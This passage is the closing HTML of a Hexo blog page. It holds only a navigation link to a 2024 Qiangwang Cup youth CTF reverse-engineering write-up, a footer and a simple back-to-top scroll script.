      title="强网杯青少年专项选拔赛 2024 Reverse方向 WriteUp"
     >
    <i class="fa-solid fa-angle-left"></i>
    <p class="title-text">
      
        强网杯青少年专项选拔赛 2024 Reverse方向 WriteUp
        
    </p>
  </a>
  <a class="article-nav-btn right  disabled "
     >

    <p class="title-text">
        
    </p>
    <i class="fa-solid fa-angle-right"></i>
  </a>
</nav>


  
</article>

 
    </div>
    <div id="footer-wrapper">
      <footer id="footer">
  
  <div id="footer-info" class="inner">
    
    &copy; 2025 Astral Prisma<br>
    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
  </div>
</footer>

    </div>
    <div class="back-to-top-wrapper">
    <button id="back-to-top-btn" class="back-to-top-btn hide" onclick="topFunction()">
        <i class="fa-solid fa-angle-up"></i>
    </button>
</div>

<script>
    function topFunction() {
        window.scroll({ top: 0, behavior: 'smooth' });
    }
    let btn = document.getElementById('back-to-top-btn');
    function scrollFunction() {
        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
            btn.classList.remove('hide')
        } else {
            btn.classList.add('hide')
        }
    }
    window.onscroll = function() {
        scrollFunction();
    }
</script>

  </div>
  <script src="/js/light-dark-switch.js"></script>
</body>
</html>
